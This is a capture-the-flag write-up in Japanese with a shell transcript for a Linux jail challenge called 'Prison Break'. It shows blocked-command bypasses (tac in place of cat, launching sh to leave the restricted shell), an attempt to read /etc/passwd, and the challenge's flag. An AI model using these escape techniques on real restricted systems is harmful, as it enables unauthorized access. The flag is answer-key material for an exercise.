# Prison Break

## Description

351

A linux jail challenge. Find a way out of prison shell! try root!

## writeup

whomai, hostname以外に、特定のコマンドを打つとブロックされました。
試しに/etc/passwdをcatするとディレクトリ情報が出てきたため、ルート配下を全て見てみると、/ctfディレクトリを確認しました。そして/ctf/*の中を見るとflag.txtがありました。そして、tacコマンドで見れました。また、shコマンドの後にコマンドを打つとフラグが見れました。

```bash
$ nc 143.198.224.219 21212
user @ csictf: $
whoami
ctf
user @ csictf: $
hostname
d9cb53aa2a9b
user @ csictf: $
cat /etc/passwd
 ________________________________________
/ Don't look at me, I'm just here to say \
\ moo. /etc/passwd                       /
 ----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
user @ csictf: $
ls /*
 ________________________________________
/ Don't look at me, I'm just here to say \
| moo. /bin /boot /ctf /dev /etc /home   |
| /lib /lib64 /media /mnt /opt /proc     |
| /root /run /sbin /srv /sys /tmp /usr   |
\ /var                                   /
 ----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
user @ csictf: $
ls /ctf/*
 ________________________________________
/ Don't look at me, I'm just here to say \
| moo. /ctf/flag.txt /ctf/script.sh      |
\ /ctf/start.sh                          /
 ----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
user @ csictf: $
tac /ctf/flag.txt
OFPPT-CTF{Pr1s0n_sh3ll_3sc4p3d}
user @ csictf: $
sh
cat ./flag.txt
OFPPT-CTF{Pr1s0n_sh3ll_3sc4p3d}
```

## FLAG

```bash
OFPPT-CTF{Pr1s0n_sh3ll_3sc4p3d}
```
